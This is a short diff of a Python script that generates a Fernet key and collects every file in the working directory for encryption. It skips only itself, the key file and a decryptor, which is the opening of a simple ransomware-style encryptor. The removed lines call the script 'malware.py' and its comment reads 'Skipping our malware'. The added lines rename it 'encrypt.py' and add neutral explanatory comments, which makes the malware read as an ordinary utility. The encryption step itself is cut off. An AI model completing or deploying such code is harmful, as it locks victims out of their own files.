@@ -1,18 +1,18 @@
 # Modules Used:
 import os
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet #Used to encrypt and decrypt data securely.
 
-#List of the Files contained in the directory
+# An empty list to store file names that will be encrypted.
 files = []
 
-# Generating the Key
+# Generates a new Fernet key used for encrypting and decrypting data. This key is crucial — losing it means the data can't be decrypted.
 Fernetkey = Fernet.generate_key()
 
 # Appending the file in the files list
 for file in os.listdir():
 
     # Skipping our malware and the key file to not to get encrypted
-    if file == "malware.py" or file == "key.key" or file == "decrypt.py":
+    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
         continue
 
     # Appending
